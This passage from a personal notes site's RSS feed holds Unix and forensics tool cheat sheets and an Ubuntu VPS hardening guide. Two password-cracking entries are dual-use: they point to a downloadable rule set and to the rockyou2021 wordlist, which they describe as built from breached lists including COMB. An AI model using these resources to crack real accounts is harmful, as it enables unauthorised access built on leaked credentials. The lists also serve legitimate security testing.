file2 file3 &amp;gt; hashes md5sum --check hashes display only modified files md5sum --quiet --check hashes identify invalid hash values md5sum --warn --check hashes Also see N/A</description></item><item><title>rules</title><link>https://notes.justin-p.me/notes/methodology/general/password-cracking/rules/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/password-cracking/rules/</guid><description>rules https://mega.nz/file/XRJBHaqC#gJDkb4GS-vaV1DL3oZ1Y8tt2V-7JOVFjQg0yT1k8Vkg
Also see Wordlist preformance</description></item><item><title>scp</title><link>https://notes.justin-p.me/cheatsheets/unix/scp/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/scp/</guid><description>scp Usage scp [OPTIONS] SOURCE_PATH DESTINATION_PATH Flags transfer directory -r see the transfer details (verbose) -v copy files with compression -C limit bandwidth -l 800 keep the original attributes -p quite -q Examples push a file to a remote system scp file user@host:/path/to/file pull a file from a remote system scp user@host:/path/to/file /local/path/to/file push multiple files to a remote system scp file1 file2 user@host:/path/to/directory push an entire directory to a remote system scp -r /path/to/directory user@host:/path/to/directory See Also SCP Cheatsheets</description></item><item><title>tar</title><link>https://notes.justin-p.me/cheatsheets/unix/tar/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/tar/</guid><description>tar Usage tar [FLAGS] FILE.tar.gz Flags -z : Work on gzip compression automatically when reading archives. -x : Extract tar.gz archive. -v : Produce verbose output i.e. display progress and extracted file list on screen. -f : Read the archive from the archive to the specified file. In this example, read backups.tar.gz archive. -t : List the files in the archive. -r : Append files to the end of the tarball.</description></item><item><title>wordlists</title><link>https://notes.justin-p.me/notes/methodology/general/password-cracking/wordlists/</link><pubDate>Tue, 10 Mar 2020 16:38:53 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/password-cracking/wordlists/</guid><description>wordlists rockyou2021
This combines all the following passwords lists: crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm hack3r.com/forum-topic/wikipedia-wordlist danielmiessler/SecLists@master/Passwords berzerk0/Probable-Wordlists weakpass.com/download password from 3.2 Billion COMB list from early this year. thanks to whoever created it. Also see Wordlist preformance</description></item><item><title>awk</title><link>https://notes.justin-p.me/cheatsheets/unix/awk/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/awk/</guid><description>awk Usage awk [OPTIONS] [PROGRAM] [FILE] Flags -F fs --field-separator fs Use fs for the input field separator (the value of the FS predefined variable). -v var=val --assign var=val Assign the value val to the variable var, before execution of the program begins. Such variable values are available to the BEGIN block of an AWK program. -f program-file --file program-file Read the AWK program source from the file program-file, instead of from the first command line argument.</description></item><item><title>curl</title><link>https://notes.justin-p.me/cheatsheets/unix/curl/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/curl/</guid><description>curl Usage curl [OPTIONS] URL Flags write to file -o &amp;lt;file&amp;gt; --output &amp;lt;file&amp;gt; Authentication https://devhints.io/curl -u &amp;lt;user&amp;gt;:&amp;lt;pass&amp;gt; --user &amp;lt;user&amp;gt;:&amp;lt;pass&amp;gt; Verbose -v --verbose Very Verbose -vv Silent -s --silent Headers only -I --head Request -X POST --request POST follow link if page redirects -L Data HTTP post data, URL encoded (eg, status=&amp;ldquo;Hello&amp;rdquo;)
-d 'data' --data 'data' data via file -d @file --data @file send data via GET -G --get Headers user-agent -A &amp;lt;str&amp;gt; --user-agent &amp;lt;str&amp;gt; cookie -b name=val --cookie name=val cookie via file -b FILE --cookie FILE Custom header -H &amp;quot;X-Foo: y&amp;quot; --header &amp;quot;X-Foo: y&amp;quot; Use deflate/gzip --compressed SSL/TLS --cacert &amp;lt;file&amp;gt; --capath &amp;lt;dir&amp;gt; Client cert file -E &amp;lt;cert&amp;gt; --cert &amp;lt;cert&amp;gt; Cert type --cert-type &amp;lt;der/pem/eng&amp;gt; Ignore SSL -k --insecure Examples Post data curl -d password=x http://x.</description></item><item><title>cut</title><link>https://notes.justin-p.me/cheatsheets/unix/cut/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/cut/</guid><description>cut Usage cut OPTION FILE Flags -b, --bytes=LIST select only these bytes -c, --characters=LIST select only these characters -d, --delimiter=DELIM use DELIM instead of TAB for field delimiter -f, --fields=LIST select only these fields; also print any line that contains no delimiter character, unless the -s option is specified -n with -b: dont split multibyte characters --complement complement the set of selected bytes, characters or fields -s, --only-delimited do not print lines not containing delimiters --output-delimiter=STRING use STRING as the output delimiter the default is to use the input delimiter --help display this help and exit --version output version information and exit Use one, and only one of -b, -c or -f.</description></item><item><title>file</title><link>https://notes.justin-p.me/cheatsheets/unix/file/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/file/</guid><description>file Usage FILE [OPTIONS] [FILE] Flags -b, --brief Do not prepend filenames to output lines (brief mode). -C, --compile Write a magic.mgc output file that contains a pre-parsed version of the magic file or directory. -c, --checking-printout Cause a checking printout of the parsed form of the magic file. This is usually used in conjunction with the -m flag to debug a new magic file before installing it. -e, --exclude testname Exclude the test named in testname from the list of tests made to determine the file type.</description></item><item><title>find</title><link>https://notes.justin-p.me/cheatsheets/unix/find/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/find/</guid><description>find Usage find PATH CONDITIONS ACTIONS Conditions search for things that contain &amp;lsquo;.c&amp;rsquo; -name &amp;quot;*.c&amp;quot; search for things owned by user &amp;lsquo;jonathan&amp;rsquo; -user jonathan search for things with no user that corresponds to file&amp;rsquo;s numeric user ID -nouser Search for specific type search for things that are files
-type f search for things that are directories
-type d search for things that are symlinks</description></item><item><title>grep</title><link>https://notes.justin-p.me/cheatsheets/unix/grep/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/grep/</guid><description>grep Usage grep [OPTIONS] PATTERN FILE Flags Generic Program Information --help Print a usage message briefly summarizing these command-line options and the bug-reporting address, then exit. -V, --version Print the version number of grep to the standard output stream. This version number should be included in all bug reports (see below). Matcher Selection -E, --extended-regexp Interpret PATTERN as an extended regular expression (ERE, see below). (-E is specified by POSIX .</description></item><item><title>gzip gunzip zcat</title><link>https://notes.justin-p.me/cheatsheets/unix/gzip-gunzip-zcat/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/gzip-gunzip-zcat/</guid><description>gzip gunzip zcat Usage gzip [OPTIONS] [FILE] gunzip [OPTIONS] [FILE] Flags -a --ascii Ascii text mode: convert end-of-lines using local conventions. This option is supported only on some non-Unix systems. For MSDOS, CR LF is converted to LF when compressing, and LF is converted to CR LF when decompressing -c --stdout --to-stdout Write output on standard output; keep original files unchanged. If there are several input files, the output consists of a sequence of independently compressed members.</description></item><item><title>rev</title><link>https://notes.justin-p.me/cheatsheets/unix/rev/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/rev/</guid><description>rev Usage rev [OPTIONS] [FILE] Flags -V, --version Display version information and exit. -h, --help Display help text and exit. Examples reverse a string echo 'string' | rev reverse a file rev file1 Also see N/A</description></item><item><title>sed</title><link>https://notes.justin-p.me/cheatsheets/unix/sed/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/sed/</guid><description>sed Usage sed [OPTIONS] [FILE] Flags -n, --quiet, --silent suppress automatic printing of pattern space --debug annotate program execution -e script, --expression=script add the script to the commands to be executed -f script-file, --file=script-file add the contents of script-file to the commands to be executed --follow-symlinks follow symlinks when processing in place -i[SUFFIX], --in-place[=SUFFIX] edit files in place (makes backup if SUFFIX supplied) -l N, --line-length=N specify the desired line-wrap length for the 'l' command --posix disable all GNU extensions.</description></item><item><title>sort</title><link>https://notes.justin-p.me/cheatsheets/unix/sort/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/sort/</guid><description>sort Usage sort [OPTIONS] [FILE] Flags -b, --ignore-leading-blanks ignore leading blanks -d, --dictionary-order consider only blanks and alphanumeric characters -f, --ignore-case fold lower case to upper case characters -g, --general-numeric-sort compare according to general numerical value -i, --ignore-nonprinting consider only printable characters -M, --month-sort compare (unknown) &amp;lt; 'JAN' &amp;lt; ... &amp;lt; 'DEC' -h, --human-numeric-sort compare human readable numbers (e.g., 2K 1G) -n, --numeric-sort compare according to string numerical value -R, --random-sort shuffle, but group identical keys.</description></item><item><title>strings</title><link>https://notes.justin-p.me/cheatsheets/unix/strings/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/strings/</guid><description>strings Usage strings [OPTIONS] [FILE] Flags -a --all - Do not scan only the initialized and loaded sections of object files; scan the whole files. -f --print-file-name Print the name of the file before each string. --help Print a summary of the program usage on the standard output and exit. -min-len -n min-len --bytes=min-len Print sequences of characters that are at least min-len characters long, instead of the default 4.</description></item><item><title>touch</title><link>https://notes.justin-p.me/cheatsheets/unix/touch/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/touch/</guid><description>touch Usage touch [OPTION] [FILE] Flags -a change only the access time -c, --no-create do not create any files -d, --date=STRING parse STRING and use it instead of current time -f (ignored) -h, --no-dereference affect each symbolic link instead of any referenced file (useful only on systems that can change the timestamps of a symlink) -m change only the modification time -r, --reference=FILE use this files times instead of current time -t STAMP use [[CC]YY]MMDDhhmm[.</description></item><item><title>tr</title><link>https://notes.justin-p.me/cheatsheets/unix/tr/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/tr/</guid><description>tr Usage Flags Examples replace lowercase letters with uppercase cat file1 | tr &amp;quot;[a-z]&amp;quot; &amp;quot;[A-Z]&amp;quot; cat file1 | tr &amp;quot;[:lower:]&amp;quot; &amp;quot;[:upper:]&amp;quot; replace spaces with tabs echo &amp;quot;file1 file2 file3&amp;quot; | tr [:space:] '\t' remove specified characters echo 'abcdefg' | tr -d 'a' remove all the digits from the string echo &amp;quot;123a467b890c&amp;quot; | tr -d [:digit:] remove all characters except digest echo &amp;quot;123a467b890c&amp;quot; | tr -cd [:digit:] Also see N/A</description></item><item><title>uniq</title><link>https://notes.justin-p.me/cheatsheets/unix/uniq/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/uniq/</guid><description>uniq Usage uniq [OPTIONS] INPUT OUTPUT Flags -c, --count prefix lines by the number of occurrences -d, --repeated only print duplicate lines, one for each group -D print all duplicate lines --all-repeated[=METHOD] like -D, but allow separating groups with an empty line; METHOD={none(default),prepend,separate} -f, --skip-fields=N avoid comparing the first N fields --group[=METHOD] show all items, separating groups with an empty line; METHOD={separate(default),prepend,append,both} -i, --ignore-case ignore differences in case when comparing -s, --skip-chars=N avoid comparing the first N characters -u, --unique only print unique lines -z, --zero-terminated line delimiter is NUL, not newline -w, --check-chars=N compare no more than N characters in lines --help display this help and exit --version output version information and exit Examples show each unique line uniq file1 show how many times a line accurse uniq -c file1 only print duplicate lines uniq -D file1 only print non-repetitive lines uniq -u file1 avoid comparing set number of initial characters uniq -s 4 file1 limit comparison to set number of chars uniq -w 3 file1 uniq comparison case insensitive uniq -i file1 uniq output NUL-terminated uniq -z file1 Also see N/A</description></item><item><title>xxd</title><link>https://notes.justin-p.me/cheatsheets/unix/xxd/</link><pubDate>Tue, 10 Mar 2020 16:38:52 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/xxd/</guid><description>xxd Usage xxd [OPTIONS] INFILE OUTFILE Flags -a -autoskip toggle autoskip: A single '*' replaces nul-lines. Default off. -b -bits Switch to bits (binary digits) dump, rather than hexdump. This option writes octets as eight digits &amp;quot;1&amp;quot;s and &amp;quot;0&amp;quot;s instead of a normal hexadecimal dump. Each line is preceded by a line number in hexadecimal and followed by an ascii (or ebcdic) representation. The command line switches -r, -p, -i do not work with this mode.</description></item><item><title>00. Introduction</title><link>https://notes.justin-p.me/guides/ubuntu-vps/00-intro/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/00-intro/</guid><description>Introduction This guide helps first timers to setup a Ubuntu server through the command-line interface (CLI). This was initially written by a old friend of mine to help me setup my first &amp;lsquo;publicly accessible&amp;rsquo; server. Over the years I build/updated his work and still use it as a reference for a basic baseline when ever I need to setup a VPS. There is a bunch of things you can do yourself to improve, finetune and further secure your VPS, but this should get you at least setup with the (imo) bare minimums.</description></item><item><title>01. Adding users</title><link>https://notes.justin-p.me/guides/ubuntu-vps/01-users/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/01-users/</guid><description>Adding users Most likely if you are setting up a VPS with a cloud provider they gave you access to the machine with the root account. Using the root account for daily tasks is against best practices, so first things first, lets create a additional account for daily administrator tasks. If you are installing in VM you most likely already setup a additional account during the installation, if so you can skip to the next page.</description></item><item><title>02. Managing of packages</title><link>https://notes.justin-p.me/guides/ubuntu-vps/02-packges/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/02-packges/</guid><description>Managing of packages Nearly all Linux distributions come preinstalled with a packet manager. A packet manager is an application that pulls software packages from a software library and installs them on the system.
Why a package manager is awesome If you want to install a web server on Windows, you will first need to manually perform several steps to download the installer and install it on your system.
On Linux (Ubuntu in this example), only a simple command is required: apt install nginx.</description></item><item><title>03. File editor: vim</title><link>https://notes.justin-p.me/guides/ubuntu-vps/03-vim/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/03-vim/</guid><description>File editor: vim Vim is a command-line text editor. Vim is entirely controlled with keyboard input, so it requires some time to get used to, but doing so will give you some hair on your chest.
Vim knows two important modes, the command-mode and the input-mode. The first one is used to enter commands. The second one is used to edit the opened file. To get you started some basic vim actions have been described below.</description></item><item><title>04. UFW</title><link>https://notes.justin-p.me/guides/ubuntu-vps/04-ufw/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/04-ufw/</guid><description>UFW UFW stands for uncomplicated firewall. UFW actually is not a firewall itself, instead it is a configuration program for iptables.
First of all, make sure that UFW is installed on the server with the following command: sudo apt install ufw
Default settings In the most cases firewalls are configured to block all incoming traffic and allow all outgoing traffic by default. If this is your first time i&amp;rsquo;d recommend configuring it like just like that.</description></item><item><title>05. SSH Keys</title><link>https://notes.justin-p.me/guides/ubuntu-vps/05-ssh-keys/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/05-ssh-keys/</guid><description>SSH Keys SSH keys allow you to connect to servers with a secret key AND password. If configured correctly, without the key a person would not be able to authenticate itself through SSH, even if it somehow got possession of your a user accounts password.
Generating and using SSH keys As a example in this guide we will use PuTTY for generating and using SSH keys. If you do not have PuTTY installed on your own system and want to follow along, click here to download it.</description></item><item><title>06. Setup sshd</title><link>https://notes.justin-p.me/guides/ubuntu-vps/06-setup-sshd/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/06-setup-sshd/</guid><description>Setup sshd Only give access to specific users and groups You can tell your server which users are allowed to connect to your server through SSH and who are not. You can do this with the the AllowUsers keyword in the SSHD configuration file.Todo so, edit the configuration file (/etc/ssh/sshd_config). The same can be done for groups using the AllowGroups keyword.
In the example below we tell our system that only the user beheer is allowed to authenticate using SSH.</description></item><item><title>07. Unattended Upgrades</title><link>https://notes.justin-p.me/guides/ubuntu-vps/07-unattended-upgrades/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/07-unattended-upgrades/</guid><description>Unattended Upgrades Updates are important. But where all lazy, so we want to automate some of this process. To ensure our server is always using the latest important security updates we are going to configure Unattended upgrades.
Normally this is installed by default, but some hosting providers might use custom images which strip some packages from the default installation.
Install unattended-upgrades sudo apt-get install unattended-upgrades sudo dpkg-reconfigure -plow unattended-upgrades Configure unattended-upgrades sudo vim /etc/apt/apt.</description></item><item><title>08. Fail2ban</title><link>https://notes.justin-p.me/guides/ubuntu-vps/08-fail2ban/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/08-fail2ban/</guid><description>Fail2Ban If you ever connected something to the public internet you might have noticed that within seconds people are knocking on your ports. To avoid people bruteforcing them self into your server you can setup Fail2Ban. Fail2Ban watches logfiles for incorrect logins and automatically bans IP&amp;rsquo;s.
Installing Fail2Ban sudo apt update &amp;amp;&amp;amp; sudo apt upgrade sudo apt install fail2ban Make sure you copy the default Fail2Ban configuration file to jail.</description></item><item><title>09. Logwatch</title><link>https://notes.justin-p.me/guides/ubuntu-vps/09-logwatch/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/09-logwatch/</guid><description>Logwatch Logwatch is a package that parses logs files on your system and sends over a report. This is a useful way to monitor whats going on and ensure you can spot issues more timely and easily.
Update and upgrade your packges sudo apt update &amp;amp;&amp;amp; sudo apt upgrade
Installing Logwatch sudo apt install logwatch
Configuring Logwatch default.conf/logwatch.conf sudo vim /usr/share/logwatch/default.conf/logwatch.conf
I&amp;rsquo;d recommend setting following parameters as below:
Output = mail Format = html MailTo = support@domain.</description></item><item><title>10. Sysctl Optimization</title><link>https://notes.justin-p.me/guides/ubuntu-vps/10-sysctl-optimization/</link><pubDate>Tue, 10 Mar 2020 16:37:55 +0100</pubDate><guid>https://notes.justin-p.me/guides/ubuntu-vps/10-sysctl-optimization/</guid><description>Sysctl Optimization Linux sysctl.conf parameter tweaking to improve memory management, network security, network performance.
Configuration Open /etc/sysctl.conf in an editor
sudo vim /etc/sysctl.conf
Add the following lines to the end of the file:
# Do not accept ICMP redirects (prevent MITM attacks) net.ipv4.conf.all.accept_redirects = 0 net.ipv6.conf.all.accept_redirects = 0 # Do not send ICMP redirects (we are not a router) net.ipv4.conf.all.send_redirects = 0 # Log Martian Packets net.ipv4.conf.all.log_martians = 1 # Controls IP packet forwarding net.</description></item><item><title>binwalk</title><link>https://notes.justin-p.me/cheatsheets/tools/binwalk/</link><pubDate>Tue, 10 Mar 2020 16:36:31 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/binwalk/</guid><description>binwalk Installation apt install binwalk Usage binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ... Flags Disassembly Scan Options: -Y, --disasm Identify the CPU architecture of a file using the capstone disassembler -T, --minsn=&amp;lt;int&amp;gt; Minimum number of consecutive instructions to be considered valid (default: 500) -k, --continue Don't stop at the first match Signature Scan Options: -B, --signature Scan target file(s) for common file signatures -R, --raw=&amp;lt;str&amp;gt; Scan target file(s) for the specified sequence of bytes -A, --opcodes Scan target file(s) for common executable opcode signatures -m, --magic=&amp;lt;file&amp;gt; Specify a custom magic file to use -b, --dumb Disable smart signature keywords -I, --invalid Show results marked as invalid -x, --exclude=&amp;lt;str&amp;gt; Exclude results that match &amp;lt;str&amp;gt; -y, --include=&amp;lt;str&amp;gt; Only show results that match &amp;lt;str&amp;gt; Extraction Options: -e, --extract Automatically extract known file types -D, --dd=&amp;lt;type[:ext[:cmd]]&amp;gt; Extract &amp;lt;type&amp;gt; signatures (regular expression), give the files an extension of &amp;lt;ext&amp;gt;, and execute &amp;lt;cmd&amp;gt; -M, --matryoshka Recursively scan extracted files -d, --depth=&amp;lt;int&amp;gt; Limit matryoshka recursion depth (default: 8 levels deep) -C, --directory=&amp;lt;str&amp;gt; Extract files/folders to a custom directory (default: current working directory) -j, --size=&amp;lt;int&amp;gt; Limit the size of each extracted file -n, --count=&amp;lt;int&amp;gt; Limit the number of extracted files -r, --rm Delete carved files after extraction -z, --carve Carve data from files, but don't execute extraction utilities -V, --subdirs Extract into sub-directories named by the offset Entropy Options: -E, --entropy Calculate file entropy -F, --fast Use faster, but less detailed, entropy analysis -J, --save Save plot as a PNG -Q, --nlegend Omit the legend from the entropy plot graph -N, --nplot Do not generate an entropy plot graph -H, --high=&amp;lt;float&amp;gt; Set the rising edge entropy trigger threshold (default: 0.</description></item><item><title>exiftool</title><link>https://notes.justin-p.me/cheatsheets/tools/exiftool/</link><pubDate>Tue, 10 Mar 2020 16:36:31 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/exiftool/</guid><description>exiftool Installation apt install exiftool Usage exiftool OPTIONS FILE Flags Tag operations -TAG or --TAG Extract or exclude specified tag -TAG[+-]=[VALUE] Write new value for tag -TAG[+-]&amp;lt;=DATFILE Write tag value from contents of file -TAG[+-]&amp;lt;SRCTAG Copy tag value (see -tagsFromFile) -tagsFromFile SRCFILE Copy tag values from file -x TAG (-exclude) Exclude specified tag Input-output text formatting -args (-argFormat) Output data as exiftool arguments -b (-binary) Output data in binary format -c FMT (-coordFormat) Set format for GPS coordinates -charset [[TYPE=]CHARSET] Specify encoding for special characters -d FMT (-dateFormat) Set format for date/time values -D (-decimal) Show tag ID numbers in decimal -E, -ex (-escape(HTML|XML)) Escape values for HTML (-E) or XML (-ex) -f (-forcePrint) Force printing of all specified tags -g[NUM.</description></item><item><title>ssh sha256 to public key</title><link>https://notes.justin-p.me/notes/random/ssh-sha256-to-public-key/</link><pubDate>Tue, 10 Mar 2020 16:36:31 +0100</pubDate><guid>https://notes.justin-p.me/notes/random/ssh-sha256-to-public-key/</guid><description>ssh sha256 to public key Accepted publickey for beheer from 10.0.0.1 port 17073 ssh2: RSA SHA256:13456798132456789123 ssh-keygen -lf ~/.ssh/authorized_keys 9999 SHA256:13456798132456789123 JustinPerdok@some-PC (RSA)</description></item><item><title>steghide</title><link>https://notes.justin-p.me/cheatsheets/tools/steghide/</link><pubDate>Tue, 10 Mar 2020 16:36:31 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/steghide/</guid><description>steghide Installation apt install steghide Usage steghide [OPTIONS] Flags the first argument must be one of the following: embed, --embed embed data extract, --extract extract data info, --info display information about a cover- or stego-file info &amp;lt;filename&amp;gt; display information about &amp;lt;filename&amp;gt; encinfo, --encinfo display a list of supported encryption algorithms version, --version display version information license, --license display steghide's license help, --help display this usage information embedding options: -ef, --embedfile select file to be embedded -ef &amp;lt;filename&amp;gt; embed the file &amp;lt;filename&amp;gt; -cf, --coverfile select cover-file -cf &amp;lt;filename&amp;gt; embed into the file &amp;lt;filename&amp;gt; -p, --passphrase specify passphrase -p &amp;lt;passphrase&amp;gt; use &amp;lt;passphrase&amp;gt; to embed data -sf, --stegofile select stego file -sf &amp;lt;filename&amp;gt; write result to &amp;lt;filename&amp;gt; instead of cover-file -e, --encryption select encryption parameters -e &amp;lt;a&amp;gt;[&amp;lt;m&amp;gt;]|&amp;lt;m&amp;gt;[&amp;lt;a&amp;gt;] specify an encryption algorithm and/or mode -e none do not encrypt data before embedding -z, --compress compress data before embedding (default) -z &amp;lt;l&amp;gt; using level &amp;lt;l&amp;gt; (1 best speed.</description></item><item><title>usbrip</title><link>https://notes.justin-p.me/cheatsheets/tools/usbrip/</link><pubDate>Tue, 10 Mar 2020 16:36:31 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/usbrip/</guid><description>usbrip usbrip is a small piece of software which analyzes Linux log data for constructing USB event history tables.
Install pip3 install --upgrade usbrip Usage usbrip [-h] {banner,events,storage,ids} ... Flags positional arguments: {banner,events,storage,ids} banner show tool banner events work with USB events storage work with USB event storage ids work with USB IDs Examples show history root@kali:/mnt/hgfs/_shared_folder/# usbrip events history _ {{4}} {v2.1.4-7} _ _ ___| |_ ___[e]___ | | |_ -| .</description></item><item><title>docker-compose</title><link>https://notes.justin-p.me/cheatsheets/programming/docker-compose/</link><pubDate>Tue, 10 Mar 2020 16:36:30 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/programming/docker-compose/</guid><description>Docker compose Basic example # docker-compose.yml version: '2' services: web: build: . # build from Dockerfile context: ./Path dockerfile: Dockerfile ports: - &amp;quot;5000:5000&amp;quot; volumes: - .:/code redis: image: redis Reference Building web: # build from Dockerfile build: . # build from custom Dockerfile build: context: ./dir dockerfile: Dockerfile.dev # build from image image: ubuntu image: ubuntu:14.04 image: tutum/influxdb image: example-registry:4000/postgresql image: a4bc65fd Ports ports: - &amp;quot;3000&amp;quot; - &amp;quot;8000:80&amp;quot; # guest:host # expose ports to linked services (not to host) expose: [&amp;quot;3000&amp;quot;] Commands # command to execute command: bundle exec thin -p 3000 command: [bundle, exec, thin, -p, 3000] # override the entrypoint entrypoint: /app/start.</description></item><item><title>Dockerfile</title><link>https://notes.justin-p.me/cheatsheets/programming/dockerfile/</link><pubDate>Tue, 10 Mar 2020 16:36:30 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/programming/dockerfile/</guid><description>dockerfile Reference Inheritance FROM ruby:2.2.2 Variables ENV APP_HOME /myapp RUN mkdir $APP_HOME Initialization RUN bundle install WORKDIR /myapp VOLUME [&amp;quot;/data&amp;quot;] # Specification for mount point ADD file.xyz /file.xyz COPY --chown=user:group host_file.xyz /path/container_file.xyz Onbuild ONBUILD RUN bundle install # when used with another file Commands EXPOSE 5900 CMD [&amp;quot;bundle&amp;quot;, &amp;quot;exec&amp;quot;, &amp;quot;rails&amp;quot;, &amp;quot;server&amp;quot;] Entrypoint ENTRYPOINT [&amp;quot;executable&amp;quot;, &amp;quot;param1&amp;quot;, &amp;quot;param2&amp;quot;] ENTRYPOINT command param1 param2 Configures a container that will run as an executable.</description></item><item><title>foremost</title><link>https://notes.justin-p.me/cheatsheets/tools/foremost/</link><pubDate>Tue, 10 Mar 2020 16:36:30 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/foremost/</guid><description>foremost Installation apt install foremost Usage foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &amp;lt;type&amp;gt;] [-s &amp;lt;blocks&amp;gt;] [-k &amp;lt;size&amp;gt;] [-b &amp;lt;size&amp;gt;] [-c &amp;lt;file&amp;gt;] [-o &amp;lt;dir&amp;gt;] [-i &amp;lt;file] Flags -V - display copyright information and exit -t - specify file type. (-t jpeg,pdf ...) -d - turn on indirect block detection (for UNIX file-systems) -i - specify input file (default is stdin) -a - Write all headers, perform no error detection (corrupted files) -w - Only write the audit file, do not write any detected files to the disk -o - set output directory (defaults to output) -c - set configuration file to use (defaults to foremost.</description></item><item><title>ncat</title><link>https://notes.justin-p.me/cheatsheets/tools/ncat/</link><pubDate>Tue, 10 Mar 2020 16:36:30 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/ncat/</guid><description>ncat Installation apt install ncat Usage Connect mode ncat --listen [&amp;lt;host&amp;gt;] [&amp;lt;port&amp;gt;] ncat -l [&amp;lt;host&amp;gt;] [&amp;lt;port&amp;gt;] Server mode Flags -4 Forces nc to use IPv4 addresses only. -6 Forces nc to use IPv6 addresses only. -b Allow broadcast. -C Send CRLF as line-ending. -D Enable debugging on the socket. -d Do not attempt to read from stdin. -h Prints out nc help. -I length Specifies the size of the TCP receive buffer.</description></item><item><title>s_client</title><link>https://notes.justin-p.me/cheatsheets/tools/openssl/s_client/</link><pubDate>Tue, 10 Mar 2020 16:36:30 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/openssl/s_client/</guid><description>s_client Usage openssl s_client OPTIONS ARGUMENTS Examples Check an SSL connection openssl s_client -connect example.com:443 openssl s_client -host example.com -port 443 Make an SSL connection. Hide most info openssl s_client --connect 127.0.0.1:30001 -quiet depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 show full certificate chain openssl s_client -showcerts -host example.com -port 443 &amp;lt;/dev/null Extract the certificate openssl s_client -connect example.</description></item><item><title>tmux</title><link>https://notes.justin-p.me/cheatsheets/unix/tmux/</link><pubDate>Tue, 10 Mar 2020 16:36:30 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/unix/tmux/</guid><description>tmux Usage start new:
tmux start new with session name:
tmux new -s myname attach:
tmux a # (or at, or attach) attach to named:
tmux a -t myname list sessions:
tmux ls kill session:
tmux kill-session -t myname Kill all the tmux sessions:
